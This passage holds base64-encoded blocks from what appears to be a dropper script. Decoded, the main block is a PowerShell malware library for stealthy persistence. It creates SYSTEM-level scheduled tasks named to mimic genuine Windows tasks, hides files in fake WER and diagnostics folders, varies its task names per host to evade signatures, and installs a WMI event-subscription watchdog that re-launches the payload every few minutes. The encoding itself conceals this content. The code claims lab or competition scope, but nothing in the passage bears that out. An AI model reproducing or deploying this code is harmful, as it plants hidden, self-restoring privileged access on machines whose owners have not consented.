ZQogICAgfSBjYXRjaCB7CiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZh
bHVlICgidGdfZmFpbCAiICsgJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlCiAgICB9Cn0K
::B64_TGR_END
::B64_LIB_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkAojIE9XTl9MSUIgIEJV
SUxEIDIwMjYwODAyTDE3CiMgU2hhcmVkIGxpYnJhcnk6IHBlci1ob3N0IGlkZW50aXR5IChhbnRp
LXNpZ25hdHVyZSksIFdNSSB3YXRjaGRvZwojIChtdXR1YWwgcGVyc2lzdGVuY2UgY2hhaW4pLCBj
YW1wYWlnbiBzdGF0ZSBmaWxlLCBTQyBzZXJ2aWNlIHJlcGFpci4KIyBMMTc6IEdyeXhhIHJlaW5z
dGFsbCBMT0NLIHdoaWxlIGFueSBub24tc2V2cnogU0MgUnVubmluZzsgRlAgZHJpZnQgbmV2ZXIg
L3guCiMgTDE2OiBORVZFUiByZWluc3RhbGwgR3J5eGEgd2hlbiBSdW5uaW5nIChwYW5lbCBkdXBs
aWNhdGVzKTsgVENQIGFkdmlzb3J5IG9ubHkuCiMgTDE1OiBncnl4YS1oZWFsdGggLyBncnl4YS1l
bnN1cmUg4oCUIDhoIGRlZXAgY2hlY2sgKFRDUC9yZWxheS9GUCBkcmlmdCByZWluc3RhbGwpLgoj
IEwxMzogc2NodGFza3MgQ3JlYXRlIHZpYSBjbWQgKGxpa2UgV3VjYWNoZU93biksIFRSIHVuZGVy
IFdpbmRvd3NcVGVtcFwud3VjYWNoZQojICAgICAgKG5vdCBBQ0wtbG9ja2VkIFByb2dyYW1EYXRh
IHBhdGgpLCAvU1QgMDA6MDAgb24gTUlOVVRFLCBubyBsZWFkaW5nIFwuCiMgTDEyOiBJREVOVFZF
Uj03IFJPT1QtbGV2ZWwgdGFzayBuYW1lcyAobmVzdGVkIE1pY3Jvc29mdFxXaW5kb3dzIEFjY2Vz
cyBEZW5pZWQpLgojIEwxMTogTkVWRVIgcmV1c2UgcmVhbCBXaW5kb3dzIGJ1aWx0LWluIHRhc2sg
bmFtZXM7IFRSIG93bmVyc2hpcCBjaGVja3MuCiMgQXV0aG9yaXplZCBpbnRlcm5hbCBkZXBsb3lt
ZW50IC0gbGFiL2NvbXBldGl0aW9uIHNjb3BlIG9ubHkuCiMg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQCltD
bWRsZXRCaW5kaW5nKCldCnBhcmFtKAogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSld
CiAgICBbVmFsaWRhdGVTZXQoJ2luaXQnLCAnd2F0Y2hkb2cnLCAnd2F0Y2hkb2ctZW5zdXJlJywg
J3Rhc2tzLWVuc3VyZScsICdzdGF0ZScsICdpZGVudGl0eScsICdyZXBhaXInLCAncmVnaXN0ZXJl
ZCcsICdleHRlcm1pbmF0ZScsICdncnl4YS1oZWFsdGgnLCAnZ3J5eGEtZW5zdXJlJyldCiAgICBb
c3RyaW5nXSRBY3Rpb24sCiAgICBbc3RyaW5nXSRXb3JrRGlyID0gJ0M6XFByb2dyYW1EYXRhXE1p
Y3Jvc29mdFxXaW5kb3dzXFdFUlxUZW1wXC53dWNhY2hlJywKICAgIFtzdHJpbmddJE1vblBhdGgg
PSAnJywKICAgIFtzdHJpbmddJEJ1aWxkICA9ICdPMTUnLAogICAgW3N0cmluZ10kRXh0cmEgID0g
JycsCiAgICBbc3RyaW5nXSRGcCAgICAgPSAnJywKICAgIFtzd2l0Y2hdJERlZXAsCiAgICBbc3dp
dGNoXSRGb3JjZQopCgokRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUn
CiRjZmdQYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdpZGVudGl0eS5jZmcnCiRJZGVudFZlcnNp
b24gPSA4CgojIFJvb3QtbGV2ZWwgbmFtZXMgV0lUSE9VVCBsZWFkaW5nIGJhY2tzbGFzaCAobWF0
Y2hlcyB3b3JraW5nIFd1Y2FjaGVPd24gc3R5bGUpLgokUG9vbHMgPSBAewogICAgQSA9IEAoJ1dl
clF1ZXVlU3luYycsJ0RpYWdIb3N0Q2FjaGUnLCdOZXRUcmFjZUNhY2hlJywnV2RpSG9zdFByb3h5
JywnUGxhU2VydmVySGVhbHRoJywnVGNwSXBDb25mbGljdFJlcycsJ1NyQ2FjaGVTeW5jJywnUmVz
b2x1dGlvblF1ZXVlJykKICAgIEIgPSBAKCdQbGFTZXJ2ZXJIZWFsdGgnLCdXZGlIb3N0UHJveHkn
LCdXZXJRdWV1ZVN5bmMnLCdOZXRUcmFjZUNhY2hlJywnRGlhZ0hvc3RDYWNoZScsJ1RjcElwQ29u
ZmxpY3RSZXMnLCdQbGFTZXJ2ZXJEaWFnJywnU3JDYWNoZVN5bmMnKQogICAgQyA9IEAoJ1Jlc29s
dXRpb25RdWV1ZScsJ05ldFRyYWNlQ2FjaGUnLCdUY3BJcENvbmZsaWN0UmVzJywnV2VyUXVldWVT
eW5jJywnUGxhU2VydmVySGVhbHRoJywnRGlhZ0hvc3RDYWNoZScsJ1BsYVNlcnZlckRpYWcnLCdX
ZGlIb3N0UHJveHknKQogICAgRCA9IEAoJ1RjcElwQ29uZmxpY3RSZXMnLCdSZXNvbHV0aW9uUXVl
dWUnLCdOZXRUcmFjZUNhY2hlJywnRGlhZ0hvc3RDYWNoZScsJ1BsYVNlcnZlckRpYWcnLCdXZXJR
dWV1ZVN5bmMnLCdQbGFTZXJ2ZXJIZWFsdGgnLCdXZGlIb3N0UHJveHknKQp9CiREZWZhdWx0cyA9
IFtvcmRlcmVkXUB7CiAgICBUQVNLX0EgPSAnV2VyUXVldWVTeW5jJwogICAgVEFTS19CID0gJ1Bs
YVNlcnZlckhlYWx0aCcKICAgIFRBU0tfQyA9ICdXZGlIb3N0UHJveHknCiAgICBUQVNLX0QgPSAn
VGNwSXBDb25mbGljdFJlcycKICAgIE1PX0EgICA9ICcyJwogICAgTU9fQiAgID0gJzMnCn0KCmZ1
bmN0aW9uIEdldC1Ib3N0U2VlZCB7CiAgICAkcyA9IDBMCiAgICBmb3JlYWNoICgkYyBpbiAkZW52
OkNPTVBVVEVSTkFNRS5Ub1VwcGVyKCkuVG9DaGFyQXJyYXkoKSkgeyAkcyA9ICgkcyAqIDMxICsg
W2ludF0kYykgJSAxMDAwMDAwMDA3IH0KICAgIHJldHVybiAkcwp9CgpmdW5jdGlvbiBSZWFkLUlk
ZW50aXR5IHsKICAgICRpZCA9ICREZWZhdWx0cy5DbG9uZSgpCiAgICBpZiAoVGVzdC1QYXRoICRj
ZmdQYXRoKSB7CiAgICAgICAgZm9yZWFjaCAoJGxpbmUgaW4gKEdldC1Db250ZW50IC1MaXRlcmFs
UGF0aCAkY2ZnUGF0aCAtRm9yY2UpKSB7CiAgICAgICAgICAgIGlmICgkbGluZSAtbWF0Y2ggJ15c
cyooW0EtWl9dKylccyo9XHMqKC4rPylccyokJykgeyAkaWRbJG1hdGNoZXNbMV1dID0gJG1hdGNo
ZXNbMl0gfQogICAgICAgIH0KICAgIH0KICAgIHJldHVybiAkaWQKfQoKZnVuY3Rpb24gUmVtb3Zl
LVRhc2tRdWlldChbc3RyaW5nXSR0bikgewogICAgaWYgKCR0bikgeyAmIHNjaHRhc2tzLmV4ZSAv
RGVsZXRlIC9UTiAkdG4gL0YgMj4mMSB8IE91dC1OdWxsIH0KfQoKZnVuY3Rpb24gR2V0LVRhc2tW
ZXJib3NlQmxvYihbc3RyaW5nXSR0bikgewogICAgaWYgKC1ub3QgJHRuKSB7IHJldHVybiAnJyB9
CiAgICAkb3V0ID0gJiBzY2h0YXNrcy5leGUgL1F1ZXJ5IC9UTiAkdG4gL0ZPIExJU1QgL1YgMj4k
bnVsbAogICAgaWYgKCRMQVNURVhJVENPREUgLW5lIDAgLW9yIC1ub3QgJG91dCkgeyByZXR1cm4g
JycgfQogICAgcmV0dXJuICgoJG91dCB8IEZvckVhY2gtT2JqZWN0IHsgIiRfIiB9KSAtam9pbiAi
YG4iKQp9CgpmdW5jdGlvbiBUZXN0LVRhc2tPd25zTW9uKFtzdHJpbmddJHRuLCBbc3RyaW5nXSRt
YXJrZXIpIHsKICAgICMgVHJ1ZSBvbmx5IGlmIHRoZSBzY2hlZHVsZWQgYWN0aW9uIHBvaW50cyBh
dCBPVVIgbW9uL2V0bCBwYXRoIOKAlCBub3QgYSBXaW5kb3dzIENPTSBoYW5kbGVyLgogICAgJGJs
b2IgPSBHZXQtVGFza1ZlcmJvc2VCbG9iICR0bgogICAgaWYgKC1ub3QgJGJsb2IpIHsgcmV0dXJu
ICRmYWxzZSB9CiAgICBpZiAoJG1hcmtlciAtYW5kICgkYmxvYiAtbWF0Y2ggW3JlZ2V4XTo6RXNj
YXBlKCRtYXJrZXIpKSkgeyByZXR1cm4gJHRydWUgfQogICAgaWYgKCRibG9iIC1tYXRjaCAnKD9p
KVwud3VjYWNoZVxcfG93bl9tb25cLmNtZHxldGxfbW9uXC5jbWR8XC5ldGxjYWNoZVxcJykgeyBy
ZXR1cm4gJHRydWUgfQogICAgcmV0dXJuICRmYWxzZQp9CgpmdW5jdGlvbiBJbml0aWFsaXplLUlk
ZW50aXR5IHsKICAgICMgSWRlbXBvdGVudCB3aXRoaW4gYW4gSURFTlRWRVIgZ2VuZXJhdGlvbi4g
UG9vbCB1cGdyYWRlcyBidW1wIElERU5UVkVSOgogICAgIyBvd25lZCBvbGQtbmFtZSB0YXNrcyBh
cmUgZGVsZXRlZDsgV2luZG93cyBidWlsdC1pbnMgd2l0aCBzYW1lIG5hbWUgYXJlIGxlZnQgYWxv
bmUuCiAgICBpZiAoVGVzdC1QYXRoICRjZmdQYXRoKSB7CiAgICAgICAgJG9sZCA9IFJlYWQtSWRl
bnRpdHkKICAgICAgICAjIEw3OiBhbHNvIHJlZ2VuZXJhdGUgaWYgYW55IFRBU0tfKiBpcyBlbXB0
eSAoTDQtTDYgbW9kdWxvL2Nhc3QgYnVncyBsZWZ0IGJsYW5rIHNsb3RzKQogICAgICAgICRzbG90
c09rID0gKCRvbGRbJ0lERU5UVkVSJ10gLWVxICIkSWRlbnRWZXJzaW9uIikgLWFuZCAkb2xkWydU
QVNLX0EnXSAtYW5kICRvbGRbJ1RBU0tfQiddIC1hbmQgJG9sZFsnVEFTS19DJ10gLWFuZCAkb2xk
WydUQVNLX0QnXQogICAgICAgIGlmICgkc2xvdHNPaykgeyByZXR1cm4gJG9sZCB9CiAgICAgICAg
Zm9yZWFjaCAoJGsgaW4gJ1RBU0tfQScsJ1RBU0tfQicsJ1RBU0tfQycsJ1RBU0tfRCcpIHsKICAg
ICAgICAgICAgJHRuID0gW3N0cmluZ10kb2xkWyRrXQogICAgICAgICAgICBpZiAoLW5vdCAkdG4p
IHsgY29udGludWUgfQogICAgICAgICAgICAjIE5ldmVyIGRlbGV0ZSBhIHJlYWwgV2luZG93cyB0
YXNrIHdlIG5ldmVyIG93bmVkIChUUiBpcyBDT00vY3VzdG9tIGhhbmRsZXIpLgogICAgICAgICAg
ICBpZiAoVGVzdC1UYXNrT3duc01vbiAkdG4gJycpIHsgUmVtb3ZlLVRhc2tRdWlldCAkdG4gfQog
ICAgICAgIH0KICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJGNmZ1BhdGggLUZvcmNl
CiAgICB9CiAgICAkcyA9IEdldC1Ib3N0U2VlZAogICAgIyBMNDogdHdvIHNsb3RzIG1heSBoYXNo
IHRvIHRoZSBzYW1lIHRhc2sgcGF0aCAocG9vbHMgc2hhcmUgbmFtZXMpIC0+CiAgICAjIG9uZSBw
aHlzaWNhbCB0YXNrIHRoZW4gc2F0aXNmaWVzIHR3byBzbG90cyBhbmQgdGhlIGZsZWV0IHNob3dz
IDMvNC4KICAgICMgV2FsayBlYWNoIHBvb2wgZm9yd2FyZCB1bnRpbCB0aGUgcGljayBpcyB1bmlx
dWUgYWNyb3NzIHNsb3RzLgogICAgIyBMNjogdGhlIG9sZCBAKEAoJ0EnLCAkcyAlIDgpLCAuLi4p
IGZvcm0gd2FzIGRvdWJsZS1icm9rZW4gaW4gUFMgNS4xOgogICAgIyBiYXJlICUgaW5zaWRlIEAo
KSBwYXJzZXMgYXMgdGhlIEZvckVhY2gtT2JqZWN0IGFsaWFzIChub3QgbW9kdWxvKSwgc28gdGhl
CiAgICAjIGNvbGxlY3Rpb24gY29sbGFwc2VkIGFuZCB0aGUgbG9vcCBuZXZlciByYW4gLT4gaWRl
bnRpdHkuY2ZnIGhhZCBFTVBUWQogICAgIyBUQVNLXyogYW5kIHRoZSB3aG9sZSBmbGVldCBmZWxs
IGJhY2sgdG8gaWRlbnRpY2FsIGRlZmF1bHQgdGFzayBuYW1lcy4KICAgICRzZWVkcyA9IFtvcmRl
cmVkXUB7CiAgICAgICAgQSA9ICgkcyAlIDgpCiAgICAgICAgQiA9ICgoJHMgKyAzKSAlIDgpCiAg
ICAgICAgQyA9ICgoJHMgKyA1KSAlIDgpCiAgICAgICAgRCA9ICgoJHMgKyA3KSAlIDgpCiAgICB9
CiAgICAkcGljayA9IFtvcmRlcmVkXUB7fQogICAgZm9yZWFjaCAoJGxldHRlciBpbiAnQScsJ0In
LCdDJywnRCcpIHsKICAgICAgICAkaSA9IFtpbnRdJHNlZWRzWyRsZXR0ZXJdCiAgICAgICAgJG5h
bWUgPSAkUG9vbHNbJGxldHRlcl1bJGldCiAgICAgICAgJG4gPSAwCiAgICAgICAgd2hpbGUgKCRw
aWNrLlZhbHVlcyAtY29udGFpbnMgJG5hbWUgLWFuZCAkbiAtbHQgOCkgeyAkaSA9ICgkaSArIDEp
ICUgODsgJG5hbWUgPSAkUG9vbHNbJGxldHRlcl1bJGldOyAkbisrIH0KICAgICAgICBpZiAoLW5v
dCAkbmFtZSkgeyAkbmFtZSA9ICREZWZhdWx0c1siVEFTS18kbGV0dGVyIl0gfQogICAgICAgICRw
aWNrWyRsZXR0ZXJdID0gJG5hbWUKICAgIH0KICAgICRjZmcgPSBAKAogICAgICAgICJUQVNLX0E9
JCgkcGljay5BKSIKICAgICAgICAiVEFTS19CPSQoJHBpY2suQikiCiAgICAgICAgIlRBU0tfQz0k
KCRwaWNrLkMpIgogICAgICAgICJUQVNLX0Q9JCgkcGljay5EKSIKICAgICAgICAiTU9fQT0kKDIg
KyAoJHMgJSA0KSkiICAgICAgICAgICMgMi01IG1pbiBqaXR0ZXIKICAgICAgICAiTU9fQj0kKDMg
KyAoKCRzICsgMSkgJSAzKSkiICAgICMgMy01IG1pbiBqaXR0ZXIKICAgICAgICAiU0VFRD0kcyIK
ICAgICAgICAiSURFTlRWRVI9JElkZW50VmVyc2lvbiIKICAgICkKICAgIFNldC1Db250ZW50IC1M
aXRlcmFsUGF0aCAkY2ZnUGF0aCAtVmFsdWUgJGNmZyAtRm9yY2UKICAgIHJldHVybiAoUmVhZC1J
ZGVudGl0eSkKfQoKZnVuY3Rpb24gTm9ybWFsaXplLVRhc2tOYW1lKFtzdHJpbmddJHRuKSB7CiAg
ICBpZiAoLW5vdCAkdG4pIHsgcmV0dXJuICcnIH0KICAgIHJldHVybiAkdG4uVHJpbSgpLlRyaW1T
dGFydCgnXCcpCn0KCmZ1bmN0aW9uIFdyaXRlLU93bkxvZyhbc3RyaW5nXSRtKSB7CiAgICAkbG9n
ID0gSm9pbi1QYXRoICRXb3JrRGlyICdib290LmVycicKICAgIHRyeSB7IEFkZC1Db250ZW50IC1M
aXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAkbSAtRm9yY2UgfSBjYXRjaCB7fQp9CgpmdW5jdGlvbiBF
bnN1cmUtUGVyc2lzdFRhc2tzIHsKICAgICMgTWlycm9yIHdvcmtpbmcgZGV0YWNoIChXdWNhY2hl
T3duKTogY21kIHNjaHRhc2tzLCBCT09UIFRSIHBhdGgsIC9TVCBvbiBNSU5VVEUuCiAgICAkaWQg
PSBJbml0aWFsaXplLUlkZW50aXR5CiAgICBpZiAoLW5vdCAkTW9uUGF0aCkgeyAkTW9uUGF0aCA9
IEpvaW4tUGF0aCAkV29ya0RpciAnb3duX21vbi5jbWQnIH0KICAgICRib290ID0gSm9pbi1QYXRo
ICRlbnY6U3lzdGVtUm9vdCAnVGVtcFwud3VjYWNoZScKICAgICRldGxEaXIgPSAnQzpcUHJvZ3Jh
bURhdGFcTWljcm9zb2Z0XERpYWdub3Npc1xTdGF0ZVwuZXRsY2FjaGUnCiAgICBmb3JlYWNoICgk
ZCBpbiBAKCRib290LCAkZXRsRGlyKSkgewogICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxp
dGVyYWxQYXRoICRkKSkgeyBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRkIC1G
b3JjZSB8IE91dC1OdWxsIH0KICAgIH0KICAgICRib290TW9uID0gSm9pbi1QYXRoICRib290ICdv
d25fbW9uLmNtZCcKICAgICRib290RXRsID0gSm9pbi1QYXRoICRib290ICdldGxfbW9uLmNtZCcK
ICAgICRldGxNb24gPSBKb2luLVBhdGggJGV0bERpciAnZXRsX21vbi5jbWQnCiAgICBpZiAoVGVz
dC1QYXRoIC1MaXRlcmFsUGF0aCAkTW9uUGF0aCkgewogICAgICAgIENvcHktSXRlbSAtTGl0ZXJh
bFBhdGggJE1vblBhdGggLURlc3RpbmF0aW9uICRib290TW9uIC1Gb3JjZSAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZQogICAgICAgIENvcHktSXRlbSAtTGl0ZXJhbFBhdGggJE1vblBhdGgg
LURlc3RpbmF0aW9uICRib290RXRsIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZQogICAgICAgIENvcHktSXRlbSAtTGl0ZXJhbFBhdGggJE1vblBhdGggLURlc3RpbmF0aW9uICRl
dGxNb24gLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICB9CiAgICAjIEJP
T1QgaXMgbm90IExvY2tEaXInZCBieSBvd25fc2VjdXJlIOKAlCBUYXNrIFNjaGVkdWxlciBjYW4g
cmVzb2x2ZSBUUiB0aGVyZS4KICAgICR0ck1vbiA9ICJjbWQuZXhlIC9jICRib290TW9uIgogICAg
JHRyRXRsID0gImNtZC5leGUgL2MgJGJvb3RFdGwiCiAgICAkbW9BID0gW3N0cmluZ10kaWRbJ01P
X0EnXTsgaWYgKC1ub3QgJG1vQSkgeyAkbW9BID0gJzInIH0KICAgICRtb0IgPSBbc3RyaW5nXSRp
ZFsnTU9fQiddOyBpZiAoLW5vdCAkbW9CKSB7ICRtb0IgPSAnMycgfQogICAgJHN0ID0gKEdldC1E
YXRlKS5Ub1N0cmluZygnSEg6bW0nKQogICAgJHNwZWNzID0gQCgKICAgICAgICBAeyBLZXkgPSAn
VEFTS19BJzsgTWFya2VyID0gJ293bl9tb24uY21kJzsgU2MgPSAnTUlOVVRFJzsgTW8gPSAkbW9B
OyBUciA9ICR0ck1vbiB9CiAgICAgICAgQHsgS2V5ID0gJ1RBU0tfQic7IE1hcmtlciA9ICdldGxf
bW9uLmNtZCc7IFNjID0gJ01JTlVURSc7IE1vID0gJG1vQjsgVHIgPSAkdHJFdGwgfQogICAgICAg
IEB7IEtleSA9ICdUQVNLX0MnOyBNYXJrZXIgPSAnb3duX21vbi5jbWQnOyBTYyA9ICdPTlNUQVJU
JzsgTW8gPSAnJzsgVHIgPSAkdHJNb24gfQogICAgICAgIEB7IEtleSA9ICdUQVNLX0QnOyBNYXJr
ZXIgPSAnb3duX21vbi5jbWQnOyBTYyA9ICdPTkxPR09OJzsgTW8gPSAnJzsgVHIgPSAkdHJNb24g
fQogICAgKQogICAgJG9rID0gMDsgJHJlYXJtZWQgPSAwOyAkZmFpbCA9IDAKICAgIGZvcmVhY2gg
KCRzcCBpbiAkc3BlY3MpIHsKICAgICAgICAkdG4gPSBOb3JtYWxpemUtVGFza05hbWUgKFtzdHJp
bmddJGlkWyRzcC5LZXldKQogICAgICAgIGlmICgtbm90ICR0bikgeyAkZmFpbCsrOyBjb250aW51
ZSB9CiAgICAgICAgaWYgKFRlc3QtVGFza093bnNNb24gJHRuICRzcC5NYXJrZXIpIHsgJG9rKys7
IGNvbnRpbnVlIH0KICAgICAgICBpZiAoVGVzdC1UYXNrT3duc01vbiAoIlwkdG4iKSAkc3AuTWFy
a2VyKSB7ICRvaysrOyBjb250aW51ZSB9CiAgICAgICAgJGJsb2IgPSBHZXQtVGFza1ZlcmJvc2VC
bG9iICR0bgogICAgICAgIGlmICgtbm90ICRibG9iKSB7ICRibG9iID0gR2V0LVRhc2tWZXJib3Nl
QmxvYiAoIlwkdG4iKSB9CiAgICAgICAgaWYgKCRibG9iKSB7CiAgICAgICAgICAgICRvdXJzQnJv
a2VuID0gKCRibG9iIC1tYXRjaCAnKD9pKW93bl9tb25cLmNtZHxldGxfbW9uXC5jbWR8XC53dWNh
Y2hlXFx8XC5ldGxjYWNoZVxcJykKICAgICAgICAgICAgaWYgKC1ub3QgJG91cnNCcm9rZW4pIHsg
JGZhaWwrKzsgV3JpdGUtT3duTG9nICJ0YXNrc19za2lwX2ZvcmVpZ24gJHRuIjsgY29udGludWUg
fQogICAgICAgICAgICBSZW1vdmUtVGFza1F1aWV0ICR0bgogICAgICAgICAgICBSZW1vdmUtVGFz
a1F1aWV0ICgiXCR0biIpCiAgICAgICAgfQogICAgICAgICMgQnVpbGQgY21kbGluZSBleGFjdGx5
IGxpa2Ugb3duLmNtZCBkZXRhY2ggKHByb3ZlbiB0byB3b3JrIGFzIFNZU1RFTSkuCiAgICAgICAg
JHBhcnRzID0gQCgKICAgICAgICAgICAgJy9DcmVhdGUnLCAnL1ROJywgJHRuLCAnL1JVJywgJ1NZ
U1RFTScsICcvUkwnLCAnSElHSEVTVCcsICcvRicsCiAgICAgICAgICAgICcvVFInLCAkc3AuVHIs
ICcvU0MnLCAkc3AuU2MKICAgICAgICApCiAgICAgICAgaWYgKCRzcC5TYyAtZXEgJ01JTlVURScp
IHsKICAgICAgICAgICAgJHBhcnRzICs9IEAoJy9NTycsICRzcC5NbywgJy9TVCcsICRzdCkKICAg
ICAgICB9CiAgICAgICAgJGFyZ0xpbmUgPSAoJHBhcnRzIHwgRm9yRWFjaC1PYmplY3QgewogICAg
ICAgICAgICBpZiAoJF8gLW1hdGNoICdbXHMiXScpIHsgJyJ7MH0iJyAtZiAoJF8gLXJlcGxhY2Ug
JyInLCAnXCInKSB9IGVsc2UgeyAkXyB9CiAgICAgICAgfSkgLWpvaW4gJyAnCiAgICAgICAgJGNy
ZWF0ZVR4dCA9IGNtZC5leGUgL2MgInNjaHRhc2tzLmV4ZSAkYXJnTGluZSIgMj4mMSB8IEZvckVh
Y2gtT2JqZWN0IHsgIiRfIiB9CiAgICAgICAgJGNyZWF0ZUpvaW5lZCA9ICgkY3JlYXRlVHh0IC1q
b2luICcgJykuVHJpbSgpCiAgICAgICAgV3JpdGUtT3duTG9nICJ0YXNrc19jcmVhdGUgJCgkc3Au
S2V5KSAkdG4gPT4gJGNyZWF0ZUpvaW5lZCIKICAgICAgICBpZiAoKFRlc3QtVGFza093bnNNb24g
JHRuICRzcC5NYXJrZXIpIC1vciAoVGVzdC1UYXNrT3duc01vbiAoIlwkdG4iKSAkc3AuTWFya2Vy
KSkgewogICAgICAgICAgICAkcmVhcm1lZCsrCiAgICAgICAgICAgIGlmICgkc3AuS2V5IC1lcSAn
VEFTS19BJyAtb3IgJHNwLktleSAtZXEgJ1RBU0tfQicpIHsKICAgICAgICAgICAgICAgIGNtZC5l
eGUgL2MgInNjaHRhc2tzLmV4ZSAvUnVuIC9UTiBgIiR0bmAiIiB8IE91dC1OdWxsCiAgICAgICAg
ICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkZmFpbCsrCiAgICAgICAgICAgIFdy
aXRlLU93bkxvZyAidGFza3NfY3JlYXRlX0ZBSUwgJCgkc3AuS2V5KSAkdG4iCiAgICAgICAgfQog
ICAgfQogICAgcmV0dXJuICJ0YXNrcyBvaz0kb2sgcmVhcm1lZD0kcmVhcm1lZCBmYWlsPSRmYWls
Igp9CgpmdW5jdGlvbiBSZW1vdmUtV2F0Y2hkb2cgewogICAgZm9yZWFjaCAoJGNscyBpbiBAKCdf
X0ZpbHRlclRvQ29uc3VtZXJCaW5kaW5nJywnX19FdmVudEZpbHRlcicsJ0NvbW1hbmRMaW5lRXZl
bnRDb25zdW1lcicsJ19fSW50ZXJ2YWxUaW1lckluc3RydWN0aW9uJykpIHsKICAgICAgICBHZXQt
V21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzICRjbHMgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUgfAogICAgICAgICAgICBXaGVyZS1PYmplY3QgewogICAg
ICAgICAgICAgICAgKCRfLk5hbWUgLWVxICdXdWNhY2hlV2F0Y2hkb2dGJykgLW9yICgkXy5OYW1l
IC1lcSAnV3VjYWNoZVdhdGNoZG9nQycpIC1vcgogICAgICAgICAgICAgICAgKCRfLlRpbWVySWQg
LWVxICdXdWNhY2hlV2F0Y2hkb2cnKSAtb3IKICAgICAgICAgICAgICAgICgkXy5GaWx0ZXIgLWFu
ZCAkXy5GaWx0ZXIuVG9TdHJpbmcoKSAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0YqJykgLW9yCiAg
ICAgICAgICAgICAgICAoJF8uQ29uc3VtZXIgLWFuZCAkXy5Db25zdW1lci5Ub1N0cmluZygpIC1s
aWtlICcqV3VjYWNoZVdhdGNoZG9nQyonKQogICAgICAgICAgICB9IHwgRm9yRWFjaC1PYmplY3Qg
eyAkXy5EZWxldGUoKSB8IE91dC1OdWxsIH0KICAgIH0KfQoKZnVuY3Rpb24gSW5zdGFsbC1XYXRj
aGRvZyB7CiAgICBpZiAoLW5vdCAkTW9uUGF0aCkgeyByZXR1cm4gJGZhbHNlIH0KICAgIFJlbW92
ZS1XYXRjaGRvZwogICAgJG9rID0gJHRydWUKICAgIHRyeSB7CiAgICAgICAgU2V0LVdtaUluc3Rh
bmNlIC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fSW50ZXJ2YWxUaW1lcklu
c3RydWN0aW9uIGAKICAgICAgICAgICAgLUFyZ3VtZW50cyBAeyBUaW1lcklkID0gJ1d1Y2FjaGVX
YXRjaGRvZyc7IEludGVydmFsTWlsbGlzZWNvbmRzID0gMTgwMDAwOyBTa2lwSWZQYXNzZWQgPSAk
ZmFsc2UgfSB8IE91dC1OdWxsCiAgICAgICAgJGYgPSBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFj
ZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19FdmVudEZpbHRlciBgCiAgICAgICAgICAgIC1B
cmd1bWVudHMgQHsgTmFtZSA9ICdXdWNhY2hlV2F0Y2hkb2dGJzsgRXZlbnROYW1lc3BhY2UgPSAn
cm9vdFxjaW12Mic7IFF1ZXJ5TGFuZ3VhZ2UgPSAnV1FMJzsKICAgICAgICAgICAgICAgICAgICAg
ICAgICBRdWVyeSA9ICJTRUxFQ1QgKiBGUk9NIF9fVGltZXJFdmVudCBXSEVSRSBUaW1lcklkPSdX
dWNhY2hlV2F0Y2hkb2cnIiB9CiAgICAgICAgJGMgPSBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFj
ZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExpbmVFdmVudENvbnN1bWVyIGAKICAg
ICAgICAgICAgLUFyZ3VtZW50cyBAeyBOYW1lID0gJ1d1Y2FjaGVXYXRjaGRvZ0MnOyBDb21tYW5k
TGluZVRlbXBsYXRlID0gImNtZC5leGUgL2MgYCIkTW9uUGF0aGAiIjsgUnVuSW50ZXJhY3RpdmVs
eSA9ICRmYWxzZSB9CiAgICAgICAgU2V0LVdtaUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9vdFxzdWJz
Y3JpcHRpb24gLUNsYXNzIF9fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcgYAogICAgICAgICAgICAt
QXJndW1lbnRzIEB7IEZpbHRlciA9ICRmOyBDb25zdW1lciA9ICRjIH0gfCBPdXQtTnVsbAogICAg
